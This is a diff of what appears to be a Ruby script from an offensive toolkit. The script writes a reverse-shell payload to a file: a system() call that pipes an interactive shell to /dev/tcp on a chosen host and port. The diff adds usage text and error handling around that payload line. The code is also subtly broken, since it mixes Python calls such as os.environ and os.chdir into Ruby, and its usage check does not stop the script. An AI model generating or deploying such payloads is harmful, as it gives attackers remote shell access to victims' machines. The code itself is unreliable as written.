@@ -41,13 +41,30 @@ port = options.local_port
 shell = options.target_shell
 file = options.output_file
 
-sleep(0.5)
-puts "#{g}Writing payload..."
-sleep(1)
-w = os.environ['OLDPWD']
-os.chdir(w)
-open(file, 'w') { |f|
-    f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\")"
-}
-g = os.environ['HOME']
-os.chdir(g + "/thoron")
+if host == "" or port == "" or shell == "" or file == ""
+    puts "Usage: ruby.rb --local-host=<local_host> --local-port=<local_port>"
+    puts "               --target-shell=<target_shell> --output-file=<output_file>"
+    puts ""
+    puts "  --local-host=<local_host>      Local host."
+    puts "  --local-port=<local_port>      Local port."
+    puts "  --target-shell=<target_shell>  Target shell."
+    puts "  --output-file=<output_file>    Output file."
+end
+  
+begin
+    sleep(0.5)
+    puts "#{g}Writing payload..."
+    sleep(1)
+    puts "#{g}Saving to #{file}..."
+    sleep(0.5)
+    w = os.environ['OLDPWD']
+    os.chdir(w)
+    open(file, 'w') { |f|
+        f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+    }
+    g = os.environ['HOME']
+    os.chdir(g + "/thoron")
+    puts "#{s}Saved to #{file}!"
+rescue
+    puts "#{e}Failed to write payload!"
+end
